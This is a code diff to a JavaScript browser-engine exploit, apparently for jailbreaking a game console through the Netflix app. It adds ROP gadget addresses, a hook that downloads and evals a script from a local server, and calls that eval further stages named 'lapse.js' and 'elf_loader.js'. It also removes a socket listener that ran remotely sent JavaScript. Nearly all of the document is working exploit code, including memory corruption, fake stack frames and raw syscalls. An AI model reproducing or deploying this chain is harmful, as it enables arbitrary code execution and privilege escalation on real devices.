@@ -2,7 +2,7 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "10.0.0.2"; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
+const ip_script = ""; // ip address of your computer running mitmproxy, MITM Proxy is handling it --> Needs to be updated
 const ip_script_port = 8080; //port that mitmproxy is on
 
 // #region misc
@@ -397,6 +397,12 @@ gadgets_eu_6 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_us_5 = {
@@ -417,6 +423,12 @@ gadgets_us_5 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_list = {
@@ -441,6 +453,50 @@ class gadgets {
     }
 };
 
+function hook_tryagain(){
+        /***** Hook "Try Again" button to reload exploit *****/
+        if (typeof util !== 'undefined' && util.changeLocation) {
+            const original_changeLocation = util.changeLocation;
+            util.changeLocation = function(url) {
+                logger.log("Reloading Javascript...");
+                
+                logger.flush();
+
+                // Load and eval our injected script instead of reloading app
+                nrdp.gibbon.load({
+                    url: 'http://127.0.0.1:40002/js/common/config/text/config.text.lruderrorpage.en.js',
+                    secure: false
+                }, function(result) {
+                    logger.flush();
+
+                    if (result.data) {
+                        logger.flush();
+                        try {
+                            eval(result.data);
+                        } catch (e) {
+                            logger.log("Eval error: " + e.message);
+                            logger.log("Stack: " + (e.stack || "none"));
+                            logger.flush();
+                        }
+                    } else {
+                        logger.log("Load failed - no data received");
+                        logger.flush();
+                    }
+                });
+
+                // Throw exception to stop execution and prevent state.exit
+                throw new Error("Exploit reload initiated");
+            };
+            logger.log("Enabled Instant JS reload...");
+            logger.flush();
+        } else {
+            logger.log("WARNING: util.changeLocation not found!");
+            logger.flush();
+        }
+    }
+
+
+
 function stringToBytes (str) {
     const len = str.length;
     const bytes = new Uint8Array(len);
@@ -462,7 +518,7 @@ function main () {
     logger.flush(); // Force immediate display
 
     try {
-
+        hook_tryagain();
         const g = new gadgets(); // Load gadgets
 
         let hole = make_hole();
@@ -1005,9 +1061,9 @@ function main () {
         */
 
         write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
-                                                                    // this is gonna be offseted by R9
-        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
-        write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
+                                                                      // this is gonna be offseted by R9
+        write64(fake_frame  - 0x28n, 0x00n);                          // Force the value of R9 = 0
+        write64(fake_frame  - 0x18n, 0xff00000000000000n);            // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                           
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
@@ -1056,11 +1112,8 @@ function main () {
             fake_rop[i++] = real_rbp;
             
             write64(add_rop_smash_code_store, 0xab00260325n);
-            oob_arr[39] = base_heap_add + fake_frame;
-            rop_smash(obj_arr[0]);          // Call ROP
-
-            //return BigInt(return_value_buffer[0]); // Return value returned by function
-            // Seems like this is not being executed
+            fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
+            rop_smash(fake_obj_arr[0]);               // Call ROP
         }
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
@@ -1194,7 +1247,7 @@ function main () {
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
 
-
+        if(ip_script === ""){send_notification("ERROR: NO IP ADDRESS CONFIGURED");}
         /******************************************************************************/
         /**********             Usefull functions for automation             **********/
         /******************************************************************************/
@@ -1334,280 +1387,23 @@ function main () {
         }
 
 
-        /***** Give time to Gibbon to populate UI *****/
-
-        sleep(20000);
-        logger.init();
-        logger.flush();
-
         /***** Let's trigger Lapse *****/
 
-        let script = get_script("1_lapse_prepare_1.js");
+
+        script = get_script("lapse.js");
         eval(script);
-        sleep(5000);
         logger.flush();
-
-        script = get_script("2_lapse_prepare_2.js");
-        eval(script);
-        sleep(5000);
-        logger.flush();
-
-        let attemp_lapse = 0;
-
-        do {
-            script = get_script("3_lapse_nf.js");
-            eval(script);
-            sleep(5000);
-            logger.flush();
-            attemp_lapse++;
-        } while (!is_jailbroken() && attemp_lapse<3)
-
-        if (!is_jailbroken()) {
-            send_notification("Jailbreak didn't succeed in 3 attemps.\nPlease restart your console and try again.");
-            throw new Error("Jailbreak didn't succeed in 3 attemps. Please restart your console and try again.");
-        }
-
-        /*****         Spawn elfldr        *****/
-        /*****  Gibbon crash after elfldr  *****/
-        sleep(10000);
+        send_notification("elf_loader.js");
         script = get_script("elf_loader.js");
         eval(script);
         logger.flush();
 
-
-        /***** Let's receive JS payloads *****/
-        const MAXSIZE = 500 * 1024;
-
-        const main_sockaddr_in = malloc(16);
-        const main_addrlen = malloc(8);
-        const main_enable = malloc(4);
-        const main_len_ptr = malloc(8);
-        const main_payload_buf = malloc(MAXSIZE);
-        let main_sock_fd = null;
-        let main_port = 0;
-
-        function create_socket() {
-            // Clear sockaddr
-            for (let i = 0; i < 16; i++) write8_uncompressed(main_sockaddr_in + BigInt(i), 0);
-
-            const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
-            if (sock_fd === 0xffffffffffffffffn) {
-                throw new Error("Socket creation failed: " + toHex(sock_fd));
-            }
-
-            write32_uncompressed(main_enable, 1);
-            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, main_enable, 4n);
-
-            write8_uncompressed(main_sockaddr_in + 1n, AF_INET);
-            write16_uncompressed(main_sockaddr_in + 2n, 0);        // port 0
-            write32_uncompressed(main_sockaddr_in + 4n, 0);        // INADDR_ANY
-
-            const bind_ret = syscall(SYSCALL.bind, sock_fd, main_sockaddr_in, 16n);
-            if (bind_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Bind failed: " + toHex(bind_ret));
-            }
-
-            const listen_ret = syscall(SYSCALL.listen, sock_fd, 3n);
-            if (listen_ret === 0xffffffffffffffffn) {
-                syscall(SYSCALL.close, sock_fd);
-                throw new Error("Listen failed: " + toHex(listen_ret));
-            }
-
-            return sock_fd;
+        if (!is_jailbroken()) {
+            send_notification("Jailbreak didn't succeed");
+            throw new Error("Jailbreak didn't succeed");
         }
 
-        function recreate_socket() {
-            const sock_fd = create_socket();
-            const port = get_port(sock_fd);
 
-            const current_ip = get_current_ip();
-            if (current_ip === null) {
-                send_notification("No network available!\nAborting...");
-                throw new Error("No network available!\nAborting...");
-            }
-
-            const network_str = current_ip + ":" + port;
-            logger.log("Socket recreated on " + network_str);
-            logger.flush();
-            send_notification("Remote JS Loader\nListening on " + network_str);
-
-            return { sock_fd, port, network_str };
-        }
-
-        function get_port(sock_fd) {
-            write32_uncompressed(main_len_ptr, 16);
-            syscall(SYSCALL.getsockname, sock_fd, main_sockaddr_in, main_len_ptr);
-
-            const port_be = read16_uncompressed(main_sockaddr_in + 2n);
-            return Number(((port_be & 0xFFn) << 8n) | ((port_be >> 8n) & 0xFFn));
-        }
-
-        function get_current_ip() {
-            // Get interface count
-            const count = Number(syscall(SYSCALL.netgetiflist, 0n, 10n));
-            if (count < 0) {
-                return null;
-            }
-            
-            // Allocate buffer for interfaces
-            const iface_size = 0x1e0;
-            const iface_buf = malloc(iface_size * count);
-            
-            // Get interface list
-            if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
-                return null;
-            }
-            
-            // Parse interfaces
-            for (let i = 0; i < count; i++) {
-                const offset = BigInt(i * iface_size);
-                
-                // Read interface name (null-terminated string at offset 0)
-                let iface_name = "";
-                for (let j = 0; j < 16; j++) {
-                    const c = Number(read8_uncompressed(iface_buf + offset + BigInt(j)));
-                    if (c === 0) break;
-                    iface_name += String.fromCharCode(c);
-                }
-                
-                // Read IP address (4 bytes at offset 0x28)
-                const ip_offset = offset + 0x28n;
-                const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
-                const ip2 = Number(read8_uncompressed(iface_buf + ip_offset + 1n));
-                const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
-                const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
-                const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-                
-                // Check if this is eth0 or wlan0 with valid IP
-                if ((iface_name === "eth0" || iface_name === "wlan0") && 
-                    iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
-                    return iface_ip;
-                }
-            }
-            
-            return null;
-        }
-
-        let attemp = 0;
-
-        do {
-            main_sock_fd = create_socket();
-            main_port = get_port(main_sock_fd);
-            if(main_port == 60000)
-                break;
-
-            syscall(SYSCALL.close, main_sock_fd);
-            attemp++;
-
-        } while (attemp < 50000);
-
-        if(attemp == 50000) {
-            logger.log("Could not get port 60000 after 50000 attemps");
-        }
-
-        const current_ip = get_current_ip();
-
-        if (current_ip === null) {
-            send_notification("No network available!\nAborting...");
-            throw new Error("No network available!\nAborting...");
-        }
-
-        let network_str = current_ip + ":" + main_port;
-        logger.log("Remote JS Loader listening on " + network_str);
-        send_notification("Remote JS Loader\nListening on " + network_str);
-        logger.flush(); // Force display before entering async loop
-
-
-        // Async socket accept loop - allows logger to stay responsive
-        (async () => {
-
-            /***** Doing everything inside this Async so every JS Payload has access to new functions in the scripts *****/
-
-            while (true) {
-                try {
-                    logger.log("Awaiting connection at " + network_str);
-                    logger.flush();
-
-                    // Yield to event loop before blocking accept() call
-                    await new Promise(resolve => nrdp.setTimeout(resolve, 10));
-
-                    write32_uncompressed(main_addrlen, 16);
-                    const client_fd = syscall(SYSCALL.accept, main_sock_fd, main_sockaddr_in, main_addrlen);
-
-                if (client_fd === 0xffffffffffffffffn) {
-                    logger.log("accept() failed: " + hex(client_fd) + " - recreating socket");
-                    syscall(SYSCALL.close, main_sock_fd);
-
-                    const recreated = recreate_socket();
-                    main_sock_fd = recreated.sock_fd;
-                    main_port = recreated.port;
-                    network_str = recreated.network_str;
-                    continue;
-                }
-
-                logger.log("Client connected, fd: " + Number(client_fd));
-                logger.flush();
-
-                let total_read = 0;
-                let read_error = false;
-
-                while (total_read < MAXSIZE) {
-                    const bytes_read = syscall(
-                        SYSCALL.read,
-                        client_fd,
-                        main_payload_buf + BigInt(total_read),
-                        BigInt(MAXSIZE - total_read)
-                    );
-
-                    const n = Number(bytes_read);
-
-                    if (n === 0) break;
-                    if (n < 0) {
-                        logger.log("read() error: " + n);
-                        read_error = true;
-                        break;
-                    }
-
-                    total_read += n;
-                    //logger.log("Read " + n + " bytes");
-                }
-
-                logger.log("Finished reading, total=" + total_read + " error=" + read_error);
-                logger.flush();
-
-                if (read_error || total_read === 0) {
-                    logger.log("No valid data received");
-                    syscall(SYSCALL.close, client_fd);
-                    continue;
-                }
-
-                const bytes = new Uint8Array(total_read);
-                for (let i = 0; i < total_read; i++) {
-                    let read = read8_uncompressed(main_payload_buf + BigInt(i));
-                    bytes[i] = Number(read);
-                }
-
-                const js_code = String.fromCharCode.apply(null, bytes);
-
-                logger.log("Executing payload...");
-                logger.flush();
-                eval(js_code);
-                logger.log("Executed successfully");
-                logger.flush();
-
-                syscall(SYSCALL.close, client_fd);
-                logger.log("Connection closed");
-                logger.flush();
-
-                } catch (e) {
-                    logger.log("ERROR in accept loop: " + e.message);
-                    logger.log(e.stack);
-                    logger.flush();
-                }
-            }
-        })(); // End of async socket accept loop
-/**/
     } catch (e) {
         logger.log("EXCEPTION: " + e.message);
         logger.log(e.stack);
